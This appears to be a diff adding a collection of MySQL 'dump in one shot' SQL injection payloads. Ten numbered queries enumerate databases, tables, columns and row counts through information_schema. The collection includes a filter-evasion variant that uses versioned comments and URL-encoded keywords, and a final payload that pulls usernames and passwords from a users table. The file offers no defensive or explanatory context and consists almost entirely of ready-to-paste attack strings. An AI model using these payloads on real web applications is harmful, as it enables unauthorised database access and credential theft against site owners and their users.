@@ -1,0 +1,66 @@
+											[DIOS QUERY COLLECTION]
+									=====================================
+ 
+ 
+1. Show All Database --->
+ 
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.schemata)where (@a)in (@a:=/*!50000concat*/(@a,schema_name,'
+'))))a)
+ 
+2.Show All Tables --->
+ 
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables)where (@a)in (@a:=/*!50000concat*/(@a,table_name,'
+'))))a)
+ 
+3. Show All Tables without information_schema  ---->
+ 
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables)where table_schema!='information_schema' and(@a)in (@a:=/*!50000concat*/(@a,table_name,'
+'))))a)
+ 
+ 
+4. Show All Database and Tables  --->
+ 
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables)where table_schema!='information_schema' and(@a)in (@a:=/*!50000concat*/(@a,table_schema,0x3a,table_name,'
+'))))a)
+ 
+ 
+5. Show All Database and Tables and Columns --->
+ 
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and(@a)in (@a:=/*!50000concat*/(@a,table_schema,' > ',table_name,' > ',column_name,'
+'))))a)
+ 
+ 
+6.Show Target Hacker Tables Name ---->
+ 
+ 
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and table_name like 'Hacker_%' and(@a)in (@a:=concat(@a,table_schema,' > ',table_name,' > ',column_name,'
+'))))a)
+ 
+ 
+7.Show Each Table and All Table Columns ---->
+ 
+(select (@a) from (select(@a:=0x00),(@tbl:=0x00),(select (@a) from (information_schema.columns) where (table_schema!='information_schema') and(0x00)in (@a:=concat(@a,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,table_schema,' :: ',@tbl:=table_name,'',column_name), (column_name))))))a)
+ 
+ 
+ 
+8. Show Each Table with Row Count and All Table Columns ---->
+ 
+(select (@a) from (select(@a:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(select (@a) from (information_schema.columns) where (table_schema!='information_schema') and(0x00)in (@a:=concat(@a,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,@tbl_sc:=table_schema,' :: ',@tbl:=table_name,' (Rows ',(select table_rows from information_schema.tables where table_schema=@tbl_sc and table_name=@tbl),')
+',column_name), (column_name))))))a)
+ 
+ 
+9. Show Each Table with Row Count & number order and All Table Columns --->
+ 
+(select (@a) from (select(@a:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(@num:=0),(select (@a) from (information_schema.columns) where (table_schema!='information_schema') and(0x00)in (@a:=concat(@a,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,@num:=(@num%2b1),0x2920,@tbl_sc:=table_schema,' :: ',@tbl:=table_name,' (Rows ',(select table_rows from information_schema.tables where table_schema=@tbl_sc and table_name=@tbl),')
+',column_name), (column_name))))))a)
+ 
+Or
+ 
+Bypass -->
+ 
+(/*!12345%73elect*/(@a)/*!12345%66rom*/(/*!12345%73elect*/(@a:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(@num:=0),(/*!12345%73elect*/(@a)/*!12345%66rom*/(/*!12345`%69nformation_%73chema`.`%63olumns`*/)%77here (`%74able_schema`!=/*!12345'%69nformation_schema'*/)and(0x00)in(@a:=%63oncat%0a(@a,0x3c62723e,if( (@tbl!=/*!12345`table_name`*/), %43oncat%0a(0x3c62723e,@num:=(@num%2b1),0x2920,@tbl_sc:=`table_schema`,0x203a3a20,@tbl:=`%74able_name`,0x2028526f777320,(/*!12345%73elect*/`table_rows`from/*!12345`%69nformation_schema`.`tables`*/where table_schema=@tbl_sc and/*!12345`%74able_name`*/=@tbl),0x293c62723e,/*!12345`%63olumn_name`*/), (/*!12345`%63olumn_name`*/))))))a)
+ 
+ 
+10. Extract Column Data from Table ------>
+ 
+(select (@) from (select(@:=0x00),(select (@) from (users) where (@)in (@:=concat(@,0x3C,0x62,0x72,0x3E,' [ ',username,' ] > ',pass,' > '))))a)#
